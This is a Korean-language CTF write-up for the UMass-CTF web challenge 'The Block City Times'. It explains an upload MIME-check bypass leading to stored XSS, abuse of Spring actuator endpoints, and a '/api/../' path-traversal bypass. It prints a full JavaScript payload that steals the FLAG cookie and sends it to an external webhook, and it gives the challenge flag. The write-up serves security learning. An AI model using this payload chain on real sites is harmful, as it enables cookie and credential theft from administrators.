---
ctf_name: "UMass-CTF"
challenge_name: "The Block City Times"
category: "web"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "ssong17"
date: "2026-04-11"
points: 100
tags: [xss]
---

# 문제명

## 문제 설명

The Block City Times is here to inform you!

- 문제 URL / 파일 등 접속 정보: 문제 URL 및 소스코드

## 풀이

### 분석

사용자가 `/submit`에서 기사 제보를 업로드할 수 있고, 업로드된 파일은 `editorial` 서비스가 관리자 계정으로 직접 열어보는 구조다.
핵심 코드는 `StoryController`와 `editorial/server.js`다.

- `StoryController`의 `/submit`은 업로드 파일의 `Content-Type`이 허용 목록에 포함되는지만 검사한다.
- 허용 타입은 `text/plain`, `application/pdf`이다.
- 저장 시에는 원본 파일명을 유지한 채 UUID만 앞에 붙여 저장한다.
- 이후 `/files/{filename}`로 해당 파일을 다시 제공한다.
- `editorial/server.js`는 관리자 로그인 후 `/files/...` URL을 Puppeteer로 방문한다.

즉, 업로드 시점의 MIME 검사는 `multipart` 헤더만 믿고 있고, 실제로 파일을 다시 열 때는 저장된 파일명 확장자 기준으로 브라우저가 해석할 수 있다. 따라서 `.html` 파일을 `text/plain`으로 속여 업로드하면 관리자 브라우저에서 HTML/JS가 실행된다.

추가로 `developer/report-api.js`를 보면 별도의 report bot이 존재한다.

- report bot은 관리자 로그인 후 `FLAG` 쿠키를 심는다.
- 이후 사용자가 지정한 `REPORT_ENDPOINT`를 방문한다.

관리자 페이지의 `/admin/report` 기능은 dev 모드에서만 동작하고, endpoint가 `/api/`로 시작하는지만 검사한다. 따라서 경로 우회가 가능하다면 업로드 파일을 report bot이 다시 열게 만들 수 있다.

### 취약점

업로드 파일 처리 과정의 MIME 불일치와 이를 이용한 Stored XSS이다.

1. 업로드 검증 우회
`/submit`에서는 업로드된 파일 파트의 `Content-Type`만 검사하므로, 실제 내용이 HTML이어도 `text/plain`으로 보내면 통과한다.

2. 관리자 자동 열람
업로드된 파일은 editorial bot이 관리자 로그인 상태로 `/files/{filename}` 경로를 방문해서 확인한다. 이때 `.html` 파일이면 브라우저에서 HTML로 렌더링되어 JavaScript가 실행된다.

3. dev 모드 전환 가능
Spring Boot actuator의 `/actuator/env`, `/actuator/refresh`를 통해 런타임 설정을 바꿀 수 있다. 이를 이용해 `app.active-config=dev`로 변경 가능하다.

4. `/admin/report` endpoint 우회
`/admin/report`는 endpoint가 `/api/`로 시작하는지만 확인한다. 그래서 `/api/../files/<payload>.html` 형태로 전달하면 실제로는 업로드한 HTML 파일을 다시 열게 만들 수 있다.

5. report bot의 FLAG 쿠키 탈취
report bot은 `FLAG` 쿠키를 설정한 뒤 지정한 endpoint를 방문하므로, 동일한 HTML payload가 두 번째로 실행될 때 `document.cookie`에서 플래그를 읽어 외부 webhook으로 유출할 수 있다.

### 익스플로잇

1. `evil.html` 파일에 XSS payload를 작성한다.
2. `/submit`으로 업로드할 때 파일 파트의 `Content-Type`은 `text/plain`으로 설정해 필터를 우회한다.
3. editorial bot이 해당 파일을 관리자 권한으로 열면서 payload가 1차 실행된다.
4. payload는 `/actuator/env`와 `/actuator/refresh`를 호출해 서버를 dev 모드로 바꾼다.
5. 이후 `/admin` 페이지에서 CSRF 토큰을 파싱한다.
6. `/admin/report`를 POST로 호출하면서 endpoint를 `/api/../files/<payload>.html`로 지정한다.
7. report bot이 관리자 로그인 + `FLAG` 쿠키가 있는 상태로 같은 payload를 다시 연다.
8. payload는 이번에는 `document.cookie`에서 `FLAG=...` 값을 읽고 webhook으로 전송한다.
9. webhook에서 플래그를 확인한다.

업로드 시에는 파일명을 .html로 유지하면서 multipart 헤더만 text/plain으로 보내야 한다.
```html
<!doctype html>
<html>
<body>
<script>
(async () => {
  const HOOK = "https://webhook.site/YOUR-ID";

  const exfil = (x) => {
    (new Image()).src = HOOK + "?d=" + encodeURIComponent(x);
  };

  try {
    if (document.cookie.includes("FLAG=")) {
      exfil(document.cookie);
      return;
    }

    await fetch("/actuator/env", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "app.active-config",
        value: "dev"
      })
    });

    await fetch("/actuator/refresh", { method: "POST" });

    const adminPage = await (await fetch("/admin")).text();
    const m = adminPage.match(/name="_csrf" value="([^"]+)"/);
    if (!m) {
      exfil("csrf parse failed");
      return;
    }

    const endpoint = "/api/.." + location.pathname;

    const resp = await fetch("/admin/report", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "_csrf=" + encodeURIComponent(m[1]) +
            "&endpoint=" + encodeURIComponent(endpoint)
    });

    const html = await resp.text();
    const flag = html.match(/FLAG=([^\s<]+)/) || html.match(/UMASS\{[^}]+\}/);

    if (flag) exfil(flag[0]);
    else exfil(html.slice(0,1500));
  } catch (e) {
    exfil("ERR:" + e);
  }
})();
</script>
</body>
</html>
```

## 플래그

```
UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}
```

## 배운 점

1. 업로드 필터가 파일 내용이 아니라 multipart의 Content-Type만 믿으면 쉽게 우회될 수 있다.
2. 파일 업로드 기능과 관리자 자동 열람 기능이 결합되면 Stored XSS로 이어지기 쉽다.
3. 단순한 prefix 검사만으로는 경로 제한이 안전하지 않다. /api/../... 같은 우회가 가능하다.
